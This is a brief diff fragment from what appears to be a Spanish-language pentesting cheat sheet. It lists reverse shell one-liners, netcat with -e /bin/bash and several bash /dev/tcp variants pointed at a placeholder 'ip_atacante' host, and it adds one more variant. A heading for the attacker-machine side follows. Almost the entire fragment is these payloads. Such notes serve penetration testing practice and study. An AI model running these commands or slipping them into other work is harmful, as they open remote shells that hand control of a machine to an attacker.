@@ -89,8 +89,10 @@ done
  nc -e /bin/bash ip_atacante 8080
  
  bash -c 'bash -i >& /dev/tcp/ip_atacante/port 0>&1'
+`bash -c "bash -i >& /dev/tcp/ip_atacante/port 0>&1"`
  bash -i >& /dev/tcp/ip_atacante/port 0>&1
 ```
+
 
 - **Desde máquina atacante**
 ```bash
